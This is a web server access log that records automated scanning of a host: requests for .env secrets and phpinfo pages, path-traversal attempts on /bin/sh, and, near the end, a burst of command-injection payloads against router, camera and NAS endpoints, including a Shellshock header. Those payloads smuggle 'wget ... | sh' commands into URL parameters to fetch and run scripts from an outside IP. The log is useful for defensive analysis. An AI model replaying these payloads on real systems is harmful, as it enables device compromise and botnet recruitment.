78.153.140.123 - - [26/Oct/2025:13:55:05 +0000] "GET /config/dev.env HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; InfoPath.2)" "-"
78.153.140.123 - - [26/Oct/2025:13:55:05 +0000] "GET /api/config.env HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.5)" "-"
78.153.140.123 - - [26/Oct/2025:13:55:06 +0000] "GET /config/env.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Mobile; LYF/F61F/LYF-F61F-000-01-14-131117; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.0" "-"
78.153.140.123 - - [26/Oct/2025:13:55:07 +0000] "GET /config/env.txt HTTP/1.1" 404 153 "-" "Opera/9.80 (X11; Linux zvav; U; de) Presto/2.12.423 Version/12.16" "-"
78.153.140.123 - - [26/Oct/2025:13:55:08 +0000] "GET /configs/db.env HTTP/1.1" 404 555 "-" "Mozilla/4.08 (compatible; MSIE 6.0; Windows NT 5.1)" "-"
78.153.140.123 - - [26/Oct/2025:13:55:09 +0000] "GET /configura/.env HTTP/1.1" 404 153 "-" "Opera/9.61 (Windows NT 5.1; U; en-GB) Presto/2.1.1" "-"
78.153.140.123 - - [26/Oct/2025:13:55:09 +0000] "GET /anaconda/..env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; EIE10;ENUSWOL; rv:11.0) like Gecko" "-"
78.153.140.123 - - [26/Oct/2025:13:55:10 +0000] "GET /console/.env.1 HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.4 Safari/532.0" "-"
78.153.140.123 - - [26/Oct/2025:13:55:11 +0000] "GET /console/.env.2 HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2)" "-"
78.153.140.123 - - [26/Oct/2025:13:55:11 +0000] "GET /.env-vault.log HTTP/1.1" 404 153 "-" "Opera/8.54 (Windows NT 5.0; U; en)" "-"
78.153.140.123 - - [26/Oct/2025:13:55:12 +0000] "GET /.env-admin.log HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-us) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7" "-"
78.153.140.123 - - [26/Oct/2025:13:55:13 +0000] "GET /.env-scheduler HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; A1-810 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30" "-"
78.153.140.123 - - [26/Oct/2025:13:55:14 +0000] "GET /.env-agent.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" "-"
78.153.140.123 - - [26/Oct/2025:13:55:14 +0000] "GET /.env-cloud.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0" "-"
78.153.140.123 - - [26/Oct/2025:13:55:15 +0000] "GET /.env-alert.log HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.2; zh) AppleWebKit/522.13.1 (KHTML, like Gecko) Version/3.0.2 Safari/522.13.1" "-"
78.153.140.123 - - [26/Oct/2025:13:55:16 +0000] "GET /.env-cloud.log HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G550FY Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36" "-"
78.153.140.123 - - [26/Oct/2025:13:55:16 +0000] "GET /.env-stack.log HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Zune 4.7; Tablet PC 2.0)" "-"
78.153.140.123 - - [26/Oct/2025:13:55:17 +0000] "GET /.env-webserver HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" "-"
78.153.140.123 - - [26/Oct/2025:13:55:18 +0000] "GET /.env-stage.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36" "-"
78.153.140.123 - - [26/Oct/2025:13:55:18 +0000] "GET /.env-stage.log HTTP/1.1" 404 153 "-" "Opera/9.80 (Windows NT 5.0; U; en) Presto/2.6.30 Version/10.63" "-"
78.153.140.123 - - [26/Oct/2025:13:55:19 +0000] "GET /.env-ssl-chain HTTP/1.1" 404 555 "-" "Mozilla/5.0 (MSIE 9.0; Windows NT 6.1; Trident/5.0)" "-"
78.153.140.123 - - [26/Oct/2025:13:55:20 +0000] "GET /.env-sanitizer HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:14.0; ips-agent) Gecko/20100101 Firefox/14.0.1" "-"
78.153.140.123 - - [26/Oct/2025:13:55:21 +0000] "GET /.env-trace.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15" "-"
78.153.140.123 - - [26/Oct/2025:13:55:21 +0000] "GET /.env-trace.log HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 1.6; en-us; SonyEricssonX10i Build/R1AA056) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1" "-"
78.153.140.123 - - [26/Oct/2025:13:55:22 +0000] "GET /.env-traceback HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; Android 4.4.2; GT-I9505 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36" "-"
78.153.140.123 - - [26/Oct/2025:13:55:23 +0000] "GET /.env-nginx.log HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-D415 Build/KOT49I.D41510e) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Mobile Safari/537.36" "-"
78.153.140.123 - - [26/Oct/2025:13:55:24 +0000] "GET /.env-whois.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Version/8.0 Mobile/12F70 Safari/600.1.4" "-"
78.153.140.123 - - [26/Oct/2025:13:55:25 +0000] "GET /.env-trail.log HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; Android 6.1.1; SAMSUNG SM-G925F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/51.0.2704.81 Mobile Safari/537.36" "-"
185.242.226.114 - - [26/Oct/2025:14:10:54 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
78.153.140.179 - - [26/Oct/2025:14:36:20 +0000] "GET /.env HTTP/1.1" 404 153 "-" "Opera/8.52 (X11; Linux x86_64; U; en)" "-"
78.153.140.179 - - [26/Oct/2025:14:36:21 +0000] "GET /api/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3" "-"
78.153.140.179 - - [26/Oct/2025:14:36:22 +0000] "GET /backend/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.122 Safari/537.36 OPR/24.0.1558.64 (Edition FCR)" "-"
78.153.140.179 - - [26/Oct/2025:14:36:22 +0000] "GET /admin/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US" "-"
78.153.140.179 - - [26/Oct/2025:14:36:23 +0000] "GET /.env.example HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.168 Safari/537.36 OPR/51.0.2830.40" "-"
78.153.140.179 - - [26/Oct/2025:14:36:24 +0000] "GET /app_dev.php/_profiler/phpinfo HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows ME; U) Opera 6.05  [de]" "-"
78.153.140.179 - - [26/Oct/2025:14:36:24 +0000] "GET /?phpinfo=-1 HTTP/1.1" 403 153 "-" "Bloglines/3.1 (http://www.bloglines.com)" "-"
78.153.140.179 - - [26/Oct/2025:14:36:25 +0000] "GET /?url=.env HTTP/1.1" 403 555 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/5.0; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)" "-"
78.153.140.179 - - [26/Oct/2025:14:36:26 +0000] "GET /staging/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" "-"
78.153.140.179 - - [26/Oct/2025:14:36:26 +0000] "GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.12; Microsoft ZuneHD 4.3)" "-"
78.153.140.179 - - [26/Oct/2025:14:36:27 +0000] "GET /phpinfo.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.0 Safari/534.24" "-"
78.153.140.179 - - [26/Oct/2025:14:36:28 +0000] "GET /info/ HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Mobile; $LYF/$F30C/$LYF_F30C-000-09-09-010218; Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.0" "-"
78.153.140.179 - - [26/Oct/2025:14:36:28 +0000] "GET /app/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; AT100 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30" "-"
78.153.140.179 - - [26/Oct/2025:14:36:29 +0000] "GET /phpinfo/ HTTP/1.1" 404 153 "-" "Opera/9.64 (Macintosh; PPC Mac OS X; U; en) Presto/2.1.1" "-"
78.153.140.179 - - [26/Oct/2025:14:36:30 +0000] "GET /dev/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SGH-T889 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "-"
78.153.140.179 - - [26/Oct/2025:14:36:30 +0000] "GET /.env.production HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6" "-"
78.153.140.179 - - [26/Oct/2025:14:36:31 +0000] "GET /.env.save HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SM-T210 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30" "-"
78.153.140.179 - - [26/Oct/2025:14:36:32 +0000] "GET /demo/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; Android 4.0.4; LG-MS770 Build/IMM76I) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19" "-"
78.153.140.179 - - [26/Oct/2025:14:36:32 +0000] "GET /?url=.env HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-G530W Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36" "-"
78.153.140.179 - - [26/Oct/2025:14:36:33 +0000] "GET /staging/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; U; Linux i686; de; rv:1.8.0.6) Gecko/20060808 Fedora/1.5.0.6-2.fc5 Firefox/1.5.0.6 pango-text" "-"
78.153.140.179 - - [26/Oct/2025:14:36:34 +0000] "GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11: Ubuntu; Linux x86_64; rv:16.0; Rover) Gecko/20100101 Firefox/16.0" "-"
78.153.140.179 - - [26/Oct/2025:14:36:34 +0000] "GET /phpinfo.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" "-"
78.153.140.179 - - [26/Oct/2025:14:36:35 +0000] "GET /info/ HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; U; Linux x86_64; nb-NO; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.04 (lucid) Firefox/3.6.13" "-"
78.153.140.179 - - [26/Oct/2025:14:36:36 +0000] "GET /app/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1" "-"
78.153.140.179 - - [26/Oct/2025:14:36:36 +0000] "GET /phpinfo/ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Mobile Safari/537.36 OPR/37.0.2192.107169" "-"
78.153.140.179 - - [26/Oct/2025:14:36:37 +0000] "GET /dev/.env HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; MS-RTC LM 8; InfoPath.3)" "-"
78.153.140.179 - - [26/Oct/2025:14:36:38 +0000] "GET /.env.production HTTP/1.1" 404 153 "-" "Opera/9.50 (Windows NT 5.2; U; it)" "-"
78.153.140.179 - - [26/Oct/2025:14:36:39 +0000] "GET /.env.save HTTP/1.1" 404 153 "-" "More Firefox 2.0.0.16 user agents strings -->>" "-"
78.153.140.179 - - [26/Oct/2025:14:36:39 +0000] "GET /demo/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9b3) Gecko/2008020514 Firefox/3.0b3" "-"
78.153.140.179 - - [26/Oct/2025:14:36:40 +0000] "GET /.env.testing HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; Android 7.1.1; SM-N950F Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36" "-"
93.174.93.12 - - [26/Oct/2025:14:52:33 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-" "-"
167.99.131.115 - - [26/Oct/2025:15:00:02 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0" "-"
167.99.131.115 - - [26/Oct/2025:15:00:03 +0000] "GET /favicon.ico HTTP/1.1" 404 153 "http://175.202.19.10/" "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0" "-"
204.76.203.219 - - [26/Oct/2025:15:43:19 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
43.167.232.38 - - [26/Oct/2025:16:02:29 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
93.174.93.12 - - [26/Oct/2025:16:15:26 +0000] "GET / HTTP/1.0" 403 153 "-" "Mozilla/5.0 (compatible; alexa site audit/1.0; +http://www.alexa.com/help/webmasters; )" "-"
121.137.139.49 - - [26/Oct/2025:16:35:04 +0000] "GET /manager/html HTTP/1.1" 404 153 "-" "python-requests/2.27.1" "-"
204.76.203.212 - - [26/Oct/2025:16:36:53 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
93.174.93.12 - - [26/Oct/2025:16:48:11 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-" "-"
83.187.112.203 - - [26/Oct/2025:16:48:48 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 157 "-" "-" "-"
149.50.97.212 - - [26/Oct/2025:16:53:57 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.136 Safari/537.36" "-"
87.120.191.93 - - [26/Oct/2025:17:23:06 +0000] "GET / HTTP/1.1" 403 153 "-" "-" "-"
204.76.203.219 - - [26/Oct/2025:17:33:02 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
43.166.247.82 - - [26/Oct/2025:18:21:33 +0000] "GET / HTTP/1.1" 400 255 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
170.106.72.93 - - [26/Oct/2025:18:26:21 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
185.242.226.114 - - [26/Oct/2025:18:31:23 +0000] "\x16\x03\x01\x00\x8B\x01\x00\x00\x87\x03\x03O\xFAI\xA3\xBE\x5C\x08\xA6\x02#\x82\x8C\x12\x1E\xF9\xA2\x0E`\xCA\xDES}=\xDC\x9E\xD3\x99\xE5\xC8|o'\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
35.204.157.49 - - [26/Oct/2025:19:04:44 +0000] "GET / HTTP/1.1" 403 153 "-" "Scrapy/2.13.3 (+https://scrapy.org)" "-"
137.220.97.83 - - [26/Oct/2025:19:10:24 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 157 "-" "-" "-"
185.247.137.118 - - [26/Oct/2025:19:16:16 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)" "-"
204.76.203.219 - - [26/Oct/2025:19:45:32 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
204.76.203.212 - - [26/Oct/2025:20:00:31 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
196.251.81.153 - - [26/Oct/2025:20:51:31 +0000] "GET /.env HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.101" "-"
43.229.20.42 - - [26/Oct/2025:21:05:51 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" "-"
45.153.34.156 - - [26/Oct/2025:21:21:31 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=%60busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.zqq.sh%7Csh%60 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - - [26/Oct/2025:21:21:31 +0000] "GET /goform/webRead/open/?path=%7Cwget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.wtf.sh%7Csh HTTP/1.0" 404 153 "-" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - - [26/Oct/2025:21:21:31 +0000] "POST /apply_sec.cgi HTTP/1.1" 404 0 "http://175.202.19.10/login_pic.asp" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - - [26/Oct/2025:21:21:32 +0000] "POST /boafrm/formSysCmd HTTP/1.1" 404 153 "-" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - - [26/Oct/2025:21:21:32 +0000] "POST /boardDataWW.php HTTP/1.1" 404 153 "http://175.202.19.10/boardDataWW.php" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - - [26/Oct/2025:21:21:32 +0000] "GET /PictureCatch.cgi?username=GEOVISION&password=%3Bbusybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.vgz.sh%7Csh%3B&data_type=1&attachment=1&channel=1&secret=1&key=PWNED HTTP/1.1" 404 153 "-" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - - [26/Oct/2025:21:21:32 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 153 "-" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - admin [26/Oct/2025:21:21:33 +0000] "POST /apply.cgi HTTP/1.1" 404 153 "http://175.202.19.10/system.html" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - ffadmin [26/Oct/2025:21:21:33 +0000] "POST /apply.cgi HTTP/1.1" 404 153 "http://175.202.19.10/apply.cgi" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - ffadmin [26/Oct/2025:21:21:33 +0000] "POST /apply.cgi HTTP/1.1" 404 153 "http://175.202.19.10/apply.cgi" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - - [26/Oct/2025:21:21:34 +0000] "GET / HTTP/1.1" 403 153 "-" "() { :; }; /bin/bash -c \x22(wget -qO- http://74.194.191.52/rondo.qre.sh||busybox wget -qO- http://74.194.191.52/rondo.qre.sh||curl -s http://74.194.191.52/rondo.qre.sh)|sh\x22& # bang2012@atomicmail.io" "-"
45.153.34.156 - admin [26/Oct/2025:21:21:34 +0000] "POST /goform/SystemCommand HTTP/1.1" 404 153 "-" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - - [26/Oct/2025:21:21:34 +0000] "GET /cgi-bin/shortcut_telnet.cgi?wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.wyu.sh%7Csh%26 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - admin [26/Oct/2025:21:21:34 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.ush.sh%7Csh%26&curpath=%2F&currentsetting.htm=1 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - admin [26/Oct/2025:21:21:35 +0000] "POST /cgi-bin/cgi_main.cgi HTTP/1.1" 404 153 "http://175.202.19.10/cfg_system_time.htm" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - admin [26/Oct/2025:21:21:35 +0000] "POST /cgi-bin/server/server.cgi?func=server02_main_submit&counter=5.22497857400916&TEST_BTN4= HTTP/1.1" 404 153 "http://175.202.19.10/cgi-bin/server/server.cgi?func=server02_main_submit&counter=6.7496022225883&TEST_BTN4=" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - - [26/Oct/2025:21:21:35 +0000] "GET /cgi-bin/iptest.cgi?cmd=iptest.cgi&-time=1504225666237&-url=%60busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.eby.sh%7Csh%60 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - admin [26/Oct/2025:21:21:35 +0000] "POST /goform/mp HTTP/1.1" 404 153 "-" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - - [26/Oct/2025:21:21:36 +0000] "POST /cgi-bin/system_mgr.cgi? HTTP/1.1" 404 153 "-" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - - [26/Oct/2025:21:21:36 +0000] "GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27%3Bwget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.djc.sh%7Csh%3B%27 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - - [26/Oct/2025:21:21:36 +0000] "POST /goform/Mail_Test HTTP/1.0" 404 153 "-" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
45.153.34.156 - - [26/Oct/2025:21:21:36 +0000] "GET /cgi-bin/;wget${IFS}-qO-${IFS}http://74.194.191.52/rondo.sbx.sh|sh&echo${IFS} HTTP/1.0" 404 153 "-" "Mozilla/5.0 (bang2012@atomicmail.io)" "-"
